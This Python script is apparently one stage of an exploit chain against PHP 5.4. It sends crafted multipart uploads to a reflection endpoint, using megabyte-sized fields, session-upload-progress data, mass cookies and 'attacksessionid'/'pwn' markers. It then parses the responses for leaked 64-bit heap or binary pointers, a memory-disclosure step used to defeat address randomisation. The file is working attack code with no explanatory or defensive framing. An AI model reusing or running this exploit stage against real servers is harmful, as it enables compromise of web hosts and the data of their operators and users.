#!/usr/bin/env python3
"""Build and parse the fixed PHP 5.4 HTTP reflection stage."""

from __future__ import annotations

import re
from dataclasses import dataclass

import probe56_leak as p


@dataclass(frozen=True)
class Case:
    label: str
    boundary: int = 71
    bb1_len: int = 1048551
    bf_len: int = 1041384
    small_fields: int = 0
    small_name_len: int = 8
    small_value_len: int = 19
    cookies: int = 0
    cookie_len: int = 47
    cookies_per_header: int = 50
    pads: int = 32
    marker_set: int = 0
    progress_len: int = 3
    sid_len: int = 30
    field_order: str = "bb1-bf-sid"


def dechunk(response: bytes) -> bytes:
    headers, sep, body = response.partition(b"\r\n\r\n")
    if not sep:
        return b""
    if b"transfer-encoding: chunked" not in headers.lower():
        return body
    result = bytearray()
    offset = 0
    while offset < len(body):
        end = body.find(b"\r\n", offset)
        if end < 0:
            break
        try:
            size = int(body[offset:end].split(b";", 1)[0], 16)
        except ValueError:
            break
        offset = end + 2
        if size == 0:
            break
        result += body[offset:offset + size]
        offset += size + 2
    return bytes(result)


def multipart(parts: list[dict[bytes, bytes]], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + part[b"name"] + b'"'
        if b"filename" in part:
            out += b'; filename="' + part[b"filename"] + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + part[b"data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def marker_bytes(case: Case) -> tuple[bytes, bytes, bytes, bytes, bytes]:
    if case.marker_set == 0:
        return b"P", b"Q", b"V", b"N", b"pwn"
    return b"R", b"S", b"W", b"M", b"xyz"


def consumer(case: Case) -> tuple[bytes, dict[tuple[str, str], bytes]]:
    bb1_fill, bf_fill, small_fill, cookie_fill, progress_pattern = marker_bytes(case)
    parts: list[dict[bytes, bytes]] = []
    expected: dict[tuple[str, str], bytes] = {}
    for index in range(case.small_fields):
        key = (str(1000 + index).encode()).ljust(case.small_name_len, b"n")[:case.small_name_len]
        value = small_fill * case.small_value_len
        parts.append({b"name": key, b"data": value})
        expected[("POST", key.decode("ascii"))] = value
    sid_pattern = b"attacksessionid0001attacksessi"
    session_id = (sid_pattern * ((case.sid_len + len(sid_pattern) - 1) // len(sid_pattern)))[:case.sid_len]
    progress = (progress_pattern * ((case.progress_len + len(progress_pattern) - 1) // len(progress_pattern)))[:case.progress_len]
    ordered = {
        "bb1": (b"900001", bb1_fill * case.bb1_len),
        "bf": (b"900002", bf_fill * case.bf_len),
        "sid": (b"PHPSESSID", session_id),
    }
    for token in case.field_order.split("-"):
        key, value = ordered[token]
        if value:
            parts.append({b"name": key, b"data": value})
            expected[("POST", key.decode("ascii"))] = value
    parts.append({b"name": b"PHP_SESSION_UPLOAD_PROGRESS", b"data": progress})
    expected[("POST", "PHPSESSID")] = session_id
    expected[("POST", "PHP_SESSION_UPLOAD_PROGRESS")] = progress

    boundary = b"C" * case.boundary
    pairs: list[bytes] = []
    for index in range(case.cookies):
        key = (f"k{index:05d}".encode()).ljust(case.cookie_len, b"N")[:case.cookie_len]
        value = (f"v{index:05d}".encode()).ljust(case.cookie_len, cookie_fill)[:case.cookie_len]
        pairs.append(key + b"=" + value)
        expected[("COOKIE", key.decode("ascii"))] = value
    headers = bytearray()
    for offset in range(0, len(pairs), max(1, case.cookies_per_header)):
        headers += b"Cookie: " + b"; ".join(pairs[offset:offset + max(1, case.cookies_per_header)]) + b"\r\n"
    response = p.post(
        "/reflect.php",
        multipart(parts, boundary),
        boundary,
        600.0,
        bytes(headers),
    )
    return response, expected


ENTRY_RE = re.compile(
    rb"^ENTRY\t(POST|COOKIE)\t(\d+)\tKLEN\t(\d+)\tKHEAD\t([0-9a-f]*)"
    rb"\tKTAIL\t([0-9a-f]*)\tTYPE\t([^\t\r\n]+)"
    rb"(?:\tVLEN\t(\d+)\tVHEAD\t([0-9a-f]*)\tVTAIL\t([0-9a-f]*))?$"
)


def canonical_offsets(blob: bytes) -> list[dict[str, str | int]]:
    hits: list[dict[str, str | int]] = []
    for offset in range(max(0, len(blob) - 7)):
        value = int.from_bytes(blob[offset:offset + 8], "little")
        if 0x0000550000000000 <= value < 0x0000800000000000:
            hits.append({"offset": offset, "value": hex(value), "width": 8})
    if len(blob) == 6:
        value = int.from_bytes(blob, "little")
        if (0x0000550000000000 <= value < 0x0000800000000000
                and any(byte < 0x20 or byte > 0x7e for byte in blob)):
            hits.append({"offset": 0, "value": hex(value), "width": 6})
    return hits


def parse_entries(body: bytes) -> list[dict[str, object]]:
    rows: list[dict[str, object]] = []
    for line in body.splitlines():
        match = ENTRY_RE.match(line)
        if not match:
            continue
        scope = match.group(1).decode()
        khead = bytes.fromhex(match.group(4).decode())
        ktail = bytes.fromhex(match.group(5).decode())
        row: dict[str, object] = {
            "scope": scope,
            "index": int(match.group(2)),
            "klen": int(match.group(3)),
            "khead_hex": khead.hex(),
            "ktail_hex": ktail.hex(),
            "type": match.group(6).decode("ascii", "replace"),
            "key": khead.decode("latin1") if int(match.group(3)) <= 64 else "",
            "canonical": canonical_offsets(khead) + canonical_offsets(ktail),
        }
        if match.group(7) is not None:
            vhead = bytes.fromhex(match.group(8).decode())
            vtail = bytes.fromhex(match.group(9).decode())
            row.update({
                "vlen": int(match.group(7)),
                "vhead_hex": vhead.hex(),
                "vtail_hex": vtail.hex(),
                "canonical_value": canonical_offsets(vhead) + canonical_offsets(vtail),
            })
        rows.append(row)
    return rows
